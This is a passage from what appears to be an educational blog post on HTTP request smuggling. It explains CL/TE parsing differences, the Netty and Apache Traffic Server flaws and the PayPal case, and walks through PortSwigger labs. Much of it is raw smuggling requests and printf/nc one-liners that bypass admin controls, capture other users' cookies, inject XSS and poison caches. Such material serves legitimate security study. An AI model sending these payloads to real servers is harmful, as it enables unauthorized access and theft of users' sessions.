foo\\r\\n'\\'length: 56\\r\\n'\\'Transfer-Encoding: chunked\\r\\n'\\'Dummy:Header\\r\\n'\\'\\r\\n'\\'0\\r\\n'\\'\\r\\n'\\'GET /tmp HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Dummy:Header\\r\\n'\\'\\r\\n'\\'GET /tests HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Dummy:Header\\r\\n'\\'\\r\\n'\\| nc -q3 127.0.0.1 8080 When some middleware processes the above request, when it encounters \\0, it will continue to read lines, which will also cause parsing differences. CRLFAccording to RFC7320 section-3.5: Although the line terminator for the start-line and header fields is the sequence CRLF, a recipient MAY recognize a single LF as a line terminator and ignore any preceding CR. In other words, in addition to CRLF, we can also use LF as EOL, but in the version of Node.js &lt;5.6.0, the handling of CRLF is also more interesting: 1[CR] + ? == [CR][LF] //true Suppose we have a Front server that parses CRLF normally, and the backend is a Node.js service with this vulnerability. We can send the following request: 12345678910GET / HTTP/1.1\\r\\nHost:localhost\\r\\nDummy: Header\\rZTransfer-Encoding: chunked\\r\\nContent-length: 52\\r\\n\\r\\n0\\r\\n\\r\\nGET /tmp HTTP/1.1\\r\\nHost:localhost\\r\\nDummy:Header\\r\\n The front server will think that Dummy: Header\\rZTransfer-Encoding: chunked\\r\\n is a header. When use CL header parsing, it will consider this a complete request, and Node.js will consider\\rZ as a Newline, according to the parsing rule that TE takes precedence over CL, it is considered that these are two requests, resulting in parsing differences. Size IssueYou can also use some coded block lengths to generate parsing differences Such as: 1234567891011121314printf 'GET / HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Transfer-Encoding: chunked\\r\\n'\\'Dummy:Header\\r\\n'\\'\\r\\n'\\'0000000000000000000000000000042\\r\\n'\\'\\r\\n'\\'GET /tmp/ HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Transfer-Encoding: chunked\\r\\n'\\'\\r\\n'\\'0\\r\\n'\\'\\r\\n'\\| nc -q3 127.0.0.1 8080 Some middleware will truncate the chunk length data when parsing the chunk size data. For example, here it is shown as only taking 0000000000000000000000000000042 as00000000000000000, so it will be considered that these are two requests. The first request’s chunk size is 0. The second will request /tmp, which results in HTTP Smuggling. HTTP VersionThis is mainly due to the problem caused by HTTP/0.9. Let’s take a look at several examples of HTTP: HTTP v1.1 12GET /foo HTTP/1.1\\r\\nHost: example.com\\r\\n HTTP v1.0 12GET /foo HTTP/1.0\\r\\n\\r\\n HTTP v0.9 1GET /foo\\r\\n And HTTP/0.9 request and response packets do not have headers. Such as: Because HTTP/0.9 response packets do not have headers, they are particularly interesting to be used in HTTP Smuggling. The meaning of this picture is that we use HTTP/0.9 for Smuggle when HTTP Smuggling. This is not the HTTP/0.9 standard format, but because some middleware no longer supports the standard format of directly parsing HTTP/0.9, but it is still possible to parse specified HTTP version. Then the following situations may exist: The above two figures show a rough attack flow. The 24-33664 bytes in chewy2.jpg have a complete HTTP response message. When Golang is processing HTTP/0.9, since we specified Range: bytes=24-33664, we can specify to obtain 24-33664 bytes of the response message, which is to obtain the HTTP message we stored in the picture, and then return it to Golang. Golang standardizes HTTP/0.9 and then remove headers. So the response looks like a new response. When a normal user requests, if Apache reuses the TCP / IP link, it will return the HTTP message we constructed in the picture as a response packet to the user. This is also a very typical idea of HTTP Response Splitting. For details, please see the video demo HTTP Smuggling Examples 2016 Has a CL in GETIn this scenario, the body is used in the GET request, and the length of the body is indicated by Content-Length. GET request is not the only one that get affected. I just use it as an example because it is typical. All HTTP requests that do not carry the request body may be affected by this. According to RFC7230 Content-Length: For example, a Content-Length header field is normally sent in a POST request even when the value is 0 (indicating an empty payload body). A user agent SHOULD NOT send a Content-Length header field when the request message does not contain a payload body and the method semantics do not anticipate such a body. In the newest RFC7231 4.3.1 GET also just mention a sentence： A payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request. For requests that have a body field and indicate the length of the body with Content-Length, the RFC does not strictly explain how the server should handle it, so most middleware also loosely handles GET requests with a body, but this is also part of the situation Because these middlewares do not have a strict standard basis, parsing differences can also cause HTTP Smuggling attacks. Here we give a simple and idealized example. The Front server allows body for GET requests, while the Backend server ignores GET requests with body. When we send following requests： 1234567GET / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 41\\r\\n\\r\\nGET /secret HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n When the Front server processes this request, it will forward the above request to the Backend server as a complete request, and the Backend service will treat this request as two requests when processing this server. 1234GET / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 41\\r\\n\\r\\n 123GET /secret HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n In this way, we can successfully perform HTTP Smuggling. From this example, it is not difficult to see that if there is a HTTP Smuggling vulnerability in the scene, then the Content-Length data becomes extra important because it affects us. Whether the attack was successful and whether our HTTP request was successfully embedded in an HTTP request. The calculation method here is similar to the previous. 12GET /secret HTTP/1.1\\r\\n --&gt; \"GET /secret HTTP/1.1\" 20 characters in total, plus 22 characters in CRLFHost: example.com\\r\\n --&gt; \"Host: example.com\" 17 characters in total, plus 19 characters in CRLF 22 + 19 = 41 Bytes. Two Identical Fields - CLHere we take Content-Length as an example. According to RFC7230 section 3.3.2: If a message is received that has multiple Content-Length header fields with field-values consisting of the same decimal value, or a single Content-Length header field with a field value containing a list of identical decimal values (e.g., “Content-Length: 42, 42”), indicating that duplicate Content-Length header fields have been generated or combined by an upstream message processor, then the recipient MUST either reject the message as invalid or replace the duplicated field-values with a single valid Content-Length field containing that decimal value prior to determining the message body length or forwarding the message. And in the RFC 7230 section 3.3.3 also mention this: If a message is received without Transfer-Encoding and with either multiple Content-Length header fields having differing field-values or a single Content-Length header field having an invalid value, then the message framing is invalid and the recipient MUST treat it as an unrecoverable error. If this is a request message, the server MUST respond with a 400 (Bad Request) status code and then close the connection. The RFC also has a relatively clear specification for this situation, but let’s assume here a relatively simple example. We send the following request: 12345678GET /suzann.html HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 0\\r\\nContent-Length: 46\\r\\n\\r\\nGET /walter.html HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n Here, we assume that the Front server uses the second Content-Length as the parsing standard, discarding the first Content-Length field or doing nothing to the first or anything else, assuming it only processes the second Content-Length field; we are assuming that the Backend server uses the first Content-Length field as the parsing standard, and ignore the second. This is equivalent to injecting another HTTP request into the HTTP request. If the entire scenario looks like ours, there is an HTTP Smuggling attack. For example, if the server uses the first Content-Length as the parsing standard, two HTTP requests will appear in the parsing. If the second is used as the parsing standard, it will be considered that there is only one HTTP request. Optional WhiteSpaceRFC7320 describes the header field like this: 3.2. Header Fields Each header field consists of a case-insensitive field name followedby a colon (“:”), optional leading whitespace, the field value, andoptional trailing whitespace. 12345678910header-field = field-name \":\" OWS field-value OWSfield-name = tokenfield-value = *( field-content / obs-fold )field-content = field-vchar [ 1*( SP / HTAB ) field-vchar ]field-vchar = VCHAR / obs-textobs-fold = CRLF 1*( SP / HTAB ) ; obsolete line folding ; see Section 3.2.4 The field-name token labels the corresponding field-value as havingthe semantics defined by that header field. For example, the Dateheader field is defined in Section 7.1.1.2 of [RFC7231] as containingthe origination timestamp for the message in which it appears. In particular, the first sentence indicates that the field should be immediately followed by : colon, then OWS (Optional WhiteSpace) optional space, then field value, and finally OWS optional space. What’s wrong with this? Obviously, if there is middleware that does not strictly follow the RFC standard for this implementation, HTTP Smuggling attacks will also occur. A typical example is CVE-2019-16869. This CVE was discovered by OPPO Meridian Internet Security Lab. It is about HTTP Smuggling vulnerability in Netty middleware. Prior to Netty 4.1.42.Final, the processing of Header headers was using [splitHeader](https://github.com/netty/netty/blob/netty-4.1.41.Final/codec-http/src/main/ java / io / netty / handler / codec / http / HttpObjectDecoder.java) method, where the key code is as follows: 123456for (nameEnd = nameStart; nameEnd &lt; length; nameEnd ++) { char ch = sb.charAt(nameEnd); if (ch == ':' || Character.isWhitespace(ch)) { break; }} We don’t need to know much about other codes. Here we can know that white space is treated the same as : colon, that is, if there is a space, the field name before : will be processed normally and will not be thrown error or other operations. This is inconsistent with the specifications of the RFC standard, and parsing differences will occur. @ Bi3g0 built a clearer schematic of the vulnerability: The example used here is to use ELB as the front server and Netty as the backend server. We send the following request: 12345678910POST /getusers HTTP/1.1Host: www.backend.comContent-Length: 64Transfer-Encoding : chunked0GET /hacker HTTP/1.1Host: www.hacker.comhacker: hacker ELB will ignore the Transfer-Encoding field, because there is a space between the colon and the colon. It does not comply with the RFC standard. It will use Content-Length as the parsing standard, so it will consider the above request as a complete request, and then throw it to the Backend server Netty. Netty will parse Transfer-Encoding first. Even if this field does not comply with the RFC standard, but because its implementation is not strict, it will split this request into two because it parses Transfer-Encoding first. 123456POST /getusers HTTP/1.1Host: www.backend.comContent-Length: 64Transfer-Encoding : chunked0 123GET /hacker HTTP/1.1Host: www.hacker.comhacker: hacker This result in HTTP smuggling. Netty fixed this vulnerability in 4.1.42 Final: Correctly handle whitespaces in HTTP header names as defined by RFC72 … When we send a header request with a space between field name and colon, netty returns 400 correctly. CL-TEIn the next few attack methods, we can use some Labs provided by @portswigger to practice for us to deepen our understanding. Labs-HTTP request smuggling Remember to cancel BurpSuite’s automatic update Content-Length function before doing it. First let’s look at the situation of CL-TE: Lab: HTTP request smuggling, basic CL.TE vulnerability This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The front-end server rejects requests that aren’t using the GET or POST method. To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST. According to the chall, we only need to let the Backend server receive the GPOST method, and the scenario clearly tells us that it is a CL-TE scenario. 123456789POST / HTTP/1.1Host: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked0G We can send above requests twice. We can make the second method to construct the HTTP method of GPOST. For details, we can follow this flowchart to see: 1234567891011User Front Backend| | ||--A(1A+1/2B)--&gt;| | | |--A(1A+1/2B)--&gt;| | |&lt;-A(200)-------|| | [1/2B]|&lt;-A(200)-------| [1/2B]|--C-----------&gt;| [1/2B]| |--C-----------&gt;| * ending B *| |&lt;--B(200)------||&lt;--B(200)------| | 1A + 1/2B means request A + an incomplete query B A(X) : means X query is hidden in body of query A ending B: the 1st line of query C ends the incomplete header of query B. all others headers are added to the query. C disappears and mix C HTTP credentials with all previous B headers (cookie/bearer token/Host, etc.) The whole process is that when we send the above request and the Front server preferentially processes with CL, it will think the following data which is 6 bytes is the body of request A. 1230\\r\\n\\r\\nG This request A will be forwarded to the backend as a complete request, and when the backend server preferentially processes it with TE, it will consider follwing data is a complete request. 1234567POST / HTTP/1.1Host: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked0 But the alone letter ‘G’, it will be considered as an incomplete request. So a 1/2 B request will be generated, so it will wait for the arrival of other data at the Backend server buffer to make the 1/2 B spliced into a complete request. When we send the second request, POST will be concatenated behind G, so the HTTP Method will become the GPOST method, which is the echo that we see, the unrecognized HTTP Method GPOST. TE-CLNext we look at the situation of TE-CL. Similarly, we use LAB experiments to deepen our understanding.：Lab: HTTP request smuggling, basic TE.CL vulnerability This lab involves a front-end and back-end server, and the back-end server doesn’t support chunked encoding. The front-end server rejects requests that aren’t using the GET or POST method. To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST. According to the chall, what we want to achieve is still to let the backend receive the GPOST request, and the scenario clearly tells us that it is a TE-CL scenario. 123456789POST / HTTP/1.1Host: acde1ffc1f047f9f8007186200ff00fe.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunked12GPOST / HTTP/1.10 It should be noted here that at the end you need to add two CRLFs to construct chunk data. 120\\r\\n\\r\\n Here we can send more than two HTTP request packets, and we can receive the response as shown below. The process flow is similar to CL-TE. When the Front server processes this request, it will be processed first according to TE. It will consider the above request as a whole and then forward it to the Backend server. When the Backend server processes it according to CL, it will consider that 12\\r\\n is the body of the first request, the following is the second request, so it will respond to GPOST as an unrecognized HTTP Method. Two Identical Fields - TEHere we look at the situation where TE exists. Similarly, we use LAB experiments to deepen our understanding:Lab: HTTP request smuggling, obfuscating the TE header This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren’t using the GET or POST method. To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST. According to the chall, what we want to achieve is still to let the backend receive the GPOST request, and the scenario clearly tells us that it is a TE-TE scenario. In fact, this scenario can also be considered as the processing of the same field. For example, when processing two TE fields, if the second TE field is taken as the parsing standard, and the second field value is abnormal or the parsing error, it may be ignored. TE field, and CL field for parsing. For example, in this LAB, we send the following request twice. 1234567891011121314151617POST / HTTP/1.1Host: acfd1f201f5fb528809b582e004200a3.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQCache-Control: max-age=0Content-length: 4Transfer-Encoding: chunkedTransfer-encoding: nothing12GPOST / HTTP/1.10 Here is the same as the previous scenario, you need to add two CRLF at the end. 120\\r\\n\\r\\n We can get the response as shown below. We can see that two TE fields are used here, and the value of the second TE field is non-standard. Here, Front chooses to process the first TE first. The entire request is a normal request and will be forwarded to the Backend server. The backend server prioritizes the second TE. If the second TE value is abnormal, the CL field will be used for processing. This request will be split into two requests due to the CL field value 4. The first request: 1234567891011121314POST / HTTP/1.1Host: acfd1f201f5fb528809b582e004200a3.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQCache-Control: max-age=0Content-length: 4Transfer-Encoding: chunkedTransfer-encoding: nothing12 The second: 123GPOST / HTTP/1.10 This sent an unrecognized HTTP Method GPOST request. Attack SurfaceAbove we have introduced several attack methods, let us see what these attack methods can be used for. We will also cooperate with the experimental environment to help understand and reproduce. Bypass Front-end Security ControlsTwo experimental environments are provided here. One is CL-TE Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability and the othter is TE-CL Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability.The two experiments finally achieved the same goal. Here we randomly choose CL-TE for experiments. This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it. To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos. The architecture is the same, but this time we need to use HTTP Smuggling to obtain admin permissions and delete the carlos user. After we generate the LAB, if we directly access /admin, we will find\"Path / admin is blocked\". It seems that we cannot access/admin through normal methods. Then we try HTTP Smuggling and send the following data packet twice. 1234567891011121314POST / HTTP/1.1Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5aContent-Length: 28Transfer-Encoding: chunked0GET /admin HTTP/1.1 The response obtained is as follows. You can see that the second request we got the response of /admin 123&lt;div class=\"container is-page\"&gt; Admin interface only available if logged in as an administrator, or if requested as localhost&lt;/div&gt; So we add the HOST header and send it again a few times 123456789101112131415POST / HTTP/1.1Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5aContent-Length: 45Transfer-Encoding: chunked0GET /admin HTTP/1.1Host: localhost We can see that the content of the /admin panel. If it dosen’t work, you can send it a few times. We got the deleted api, so we can use HTTP Smuggling to access this /admin/delete?username=carlos, and construct the following data packet. 123456789101112131415POST / HTTP/1.1Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5aContent-Length: 63Transfer-Encoding: chunked0GET /admin/delete?username=carlos HTTP/1.1Host: localhost This attack method is similar to HTTP SSRF. The main point is to control the value of CL. For example, the value of CL in the first packet is 28, which is calculated as follows: 12340\\r\\n --&gt; 3 bytes\\r\\n --&gt; 2 bytesGET /admin HTTP/1.1\\r\\n --&gt; 19+2 = 21 bytes\\r\\n --&gt; 2 bytes So it is 3+2+21+2 = 28 bytes in total. The situation of TE-CL is similar, so the example will not be repeated here. Revealing Front-end Request Rewriting In some network environments, the front-end proxy server does not forward the request directly to the back-end server after receiving the request. Instead, it adds some necessary fields and then forwards it to the back-end server. These fields are required by the backend server to process the request, such as: - Describe the protocol name and password used by the TLS connection - XFF header containing the user's IP address - User's session token ID In short, if we can't get the fields added or rewritten by the proxy server, our smuggled past requests can't be processed correctly by the backend server. So how do we get these values? PortSwigger provides a very simple method, mainly in three major steps: - Find a POST request that can output the value of the request parameter to the response - Put the special parameter found in the POST request at the end of the message. - Then smuggle this request and then send a normal request directly, and some fields that the front-end server rewrites for this request will be displayed. Sometimes the Front server adds some request headers to the forwarded request and forwards them to the Backend server. We can use HTTP Smuggling to leak these request headers. We also use LAB to understand. Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. There’s an admin panel at /admin, but it’s only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It’s similar to the X-Forwarded-For header but has a different name. To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos. According to the title hint here, the scene is a CL-TE scene and a search box is given. We try to search for a 123 at will. We can find that the search result “123” is directly echoed into the corresponding one. Attempted access using HTTP Smuggling, but was blocked. But we can try to use the search echo to leak the request header forwarded by the Front server: If you only add the X-*-Ip request header later, you cannot access the admin panel, because this will make Backend receive two duplicate request headers. In this scenario, the Backend server judges the duplicate request headers. So we need to “hide” the request headers added by the Front server, we can use Smuggling to “hide” the request headers added by other Front servers, and then we can get the admin panel. The whole process looks relatively simple, but if you do it carefully, you will find the CL value is quite important. Let’s take a look at how the CL value of the packet requested by the Front is calculated: 12345670\\r\\n --&gt; 3 bytes\\r\\n --&gt; 2 bytesPOST / HTTP/1.1\\r\\n --&gt; 17 bytesContent-Length: 70\\r\\n --&gt; 20 bytesContent-Type: application/x-www-form-urlencoded\\r\\n --&gt; 49 bytes\\r\\n --&gt; 2 bytessearch=123 --&gt; 10 bytes There are 103 bytes in total. And the CL here may not be 70. Here, we only control how many bytes are leaked. Another thing to note is that if you don’t add a Content-Type field, you need to add a CRLF at the end, otherwise it will return 400. Capturing other users’ requestsNow that we can get middleware requests, of course, we can also try to get requests from other users, and also get cookies, etc. Lab: Exploiting HTTP request smuggling to capture other users’ requests This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. To solve the lab, smuggle a request to the back-end server that causes the next user’s request to be stored in the application. Then retrieve the next user’s request and use the victim user’s cookies to access their account. The principle is relatively simple. We can find a place to send a comment, and then use the comment to perform HTTP Smuggling. For example, we can construct the following request packet. 12345678910111213141516171819202122POST / HTTP/1.1Host: ac951f7d1e9ea625803c617f003f005c.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2AtUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 271Transfer-Encoding: chunked0POST /post/comment HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 600Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2Atcsrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN&amp;postId=5&amp;name=1&amp;email=1%40qq.com&amp;website=http%3A%2F%2Fwww.baidu.com&amp;comment=1 As long as the later CL is large enough, we can use HTTP Smuggling to stitch the next user’s request into our last comment parameter, and then we can see the request header of others when we look at the comment. Exploit Reflected XSSThis usage scenario may be limited and rare, but if HTTP Smuggling &amp; reflected XSS exists, we can combinate two methods to leak others’ cookies. This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The application is also vulnerable to reflected XSS via the User-Agent header. To solve the lab, smuggle a request to the back-end server that causes the next user’s request to receive a response containing an XSS exploit that executes alert(1). Still in the CL-TE, we can find a reflection XSS at the UA, but this is useless, so we have to find some way to upgrade the hazard. We can construct the following packets, just send them once. 1234567891011121314151617181920POST / HTTP/1.1Host: ac811f011e27d43b80301693005a0007.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZUpgrade-Insecure-Requests: 1Content-Length: 150Transfer-Encoding: chunked0GET /post?postId=5 HTTP/1.1User-Agent: \"&gt;&lt;script&gt;alert(1)&lt;/script&gt;Content-Type: application/x-www-form-urlencodedContent-Length: 5x=1 Then we casually visit any page on the site and it will alert(1) because our request is embedded in the second request above. Turn An On-Site Redirect Into An Open RedirectThis attack scenario is when the target uses a 30x code to redirect and uses the Host header to redirect. For example, we send following requests. 12GET /home HTTP/1.1Host: normal-website.com We will get responses. 12HTTP/1.1 301 Moved PermanentlyLocation: https://normal-website.com/home/ It looks harmless, but if we cooperate with HTTP Smuggling, it will be a problem. Such as: 12345678910POST / HTTP/1.1Host: vulnerable-website.comContent-Length: 54Transfer-Encoding: chunked0GET /home HTTP/1.1Host: attacker-website.comFoo: X The subsequent requests after smuggling look like this: 1234GET /home HTTP/1.1Host: attacker-website.comFoo: XGET /scripts/include.js HTTP/1.1Host: vulnerable-website.com Then if the server redirects according to the Host header, we will get the following response. 12HTTP/1.1 301 Moved PermanentlyLocation: https://attacker-website.com/home/ In this way, the user who visits /scripts/include.js will be redirected to the URL we control. Perform Web Cache PoisoningThis scenario is also based on the Host redirect attack scenario above. If the Front server still has cache static resources, we can cooperate with HTTP Smuggling to perform cache poisoning. Lab: Exploiting HTTP request smuggling to perform web cache poisoning This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The front-end server is configured to cache certain responses. To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. This environment is also a scenario where the host can be modified to redirect, and the /post/next?postId=2 route redirect to /post?postId=4. According to the description of the call, we need to implement cache poisoning. For example, here we choose /resources/js/tracking.js for poisoning. LAB also gives us a service for manufacturing poisoning, so we can set the following settings. Send the following packets once. 12345678910111213141516171819202122POST / HTTP/1.1Host: ac7a1f141fadd93d801c469f005500bf.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=f6c7ZBB52a6iedorGSywc8jM6USu4685Upgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 178Transfer-Encoding: chunked0GET /post/next?postId=3 HTTP/1.1Host: ac701fe61fabd97b8027465701f800a8.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 10x=1 Then visit /resources/js/tracking.js: We can see that the redirect address of the response packet has been changed to the our exploit address, and then we visit the normal server homepage. We can alert(1) ! The entire process can be understood using the following processes. 12345678910111213Innocent Attacker Front Backend | | | | | |--A(1A+1/2B)--&gt;| | | | |--A(1A+1/2B)--&gt;| | | |&lt;-A(200)-------| | | | [1/2B] | |&lt;-A(200)-------| [1/2B] | |--C-----------&gt;| [1/2B] | | |--C-----------&gt;| * ending B * | | [*CP*]&lt;--B(200)----| | |&lt;--B(200)------| | |--C---------------------------&gt;| | |&lt;--B(200)--------------------[HIT] | 1A + 1/2B means request A + an incomplete query B A(X) : means X query is hidden in body of query A CP : Cache poisoning Similar to the previous flowchart, because /resources/js/tracking.js requested in C will be cached by Front as a static resource, and we use HTTP Smuggling to direct this request to our exploit server and returnalert(1) to request C, and then this response packet will be cached by the Front server, so we have successfully poisoned. Perform Web Cache DeceptionIn fact, this scenario is similar to cache poisoning, but with a slight difference. According to more official statements, cache cheating and cache poisoning have the following differences. What is the difference between web cache poisoning and web cache deception? - In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users. - In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache. This we do not cooperate with Lab. Because the environment provided by Lab maybe not work correctly. But we can do like this to understand easily. We send the following HTTP request. 123456789POST / HTTP/1.1Host: vulnerable-website.comContent-Length: 43Transfer-Encoding: chunked0GET /private/messages HTTP/1.1Foo: X The smuglling request will use Foo: X to hide the first line of the next request header sent, which is the lineGET /xxx HTTP/1.1, and this request will be accessed with the user’s cookie. Similar to a CSRF, the request becomes the following request header. 1234GET /private/messages HTTP/1.1Foo: XGET /static/some-image.png HTTP/1.1Host: vulnerable-website.comCookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z As long as we send more times, once the user accesses the static resource, it may be cached by the Front server, and we can get the information of the user /private/messages. There may be a lot of repeated packet sending here, because you need to construct a static resource cache, or you need some luck. So far, the basic attack surface of HTTP Smuggling has been introduced. Real WorldPaypalFirst of all, I have to talk about the Paypal vulnerability instance shared by the author of HTTP Smuggling on Black Hat this year. The author first poisoned a js file for Paypal login through HTTP Smuggling. 123456789101112131415POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 Host: c.paypal.comContent-Length: 61 Transfer-Encoding: chunked0GET /webstatic HTTP/1.1Host: skeletonscribe.net?X: XGET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 Host: c.paypal.comConnection: closeHTTP/1.1 302 FoundLocation: http://skeletonscribe.net?, c.paypal.com/webstatic/ But the Paypal login page has a CSP rule script-src which block this redirect. Later, the author noticed that the login page loads a sub-page on c.paypal.com in a dynamically generated iframe. This sub-page didn’t use CSP and also used a js file poisoned by the author! Although this can control the iframe page, because of the same-origin policy, the data of the parent page cannot be read. His colleague then discovered a page at paypal.com/us/gifts that didn’t use CSP, and also imported his poisoned JS file. By using his JS to redirect the c.paypal.com iframe to that URL (and triggering our JS import for the third time) he could finally access the parent and steal plaintext PayPal passwords from everyone who logged in using Safari or IE. Paypal’s first fix was to modify the Akamai configuration to reject requests containing Transfer-Encoding: chunked. But the author bypassed it quikly by constructing a newline header. 12Transfer-Encoding: chunked ATS ​ Apache Traffic Server (ATS) is an efficient, scalable HTTP proxy and cache server for the Apache Software Foundation. There are multiple HTTP smuggling and cache poisoning issues when clients making malicious requests interact with Apache Traffic Server (ATS). This affects versions 6.0.0 to 6.2.2 and 7.0.0 to 7.1.3. In NVD, we can find four patches for this vulnerability, so let’s take a closer look. CVE-2018-8004 Patch list: https://github.com/apache/trafficserver/pull/3192 https://github.com/apache/trafficserver/pull/3201 https://github.com/apache/trafficserver/pull/3231 https://github.com/apache/trafficserver/pull/3251 Note: Although the vulnerability notification describes the scope of the vulnerability to version 7.1.3, from the version of the patch archive on github, most of the vulnerabilities have been fixed in version 7.1.3. About the analysis and recurrence of these four patches, I think @mengchen has already written very detailed, I will not repeat to talk about them. It is recommended to read the original part HTTP Smuggling Attack Example——CVE-2018-8004. Here we talk about the part that is not in the original text. 1234567891011121314[dummy-host7.example.com] | +-[8080]-----+ | 8007-&gt;8080 | | ATS7 | | | +-----+------+ | | +--[80]----+ | 8002-&gt;80 | | 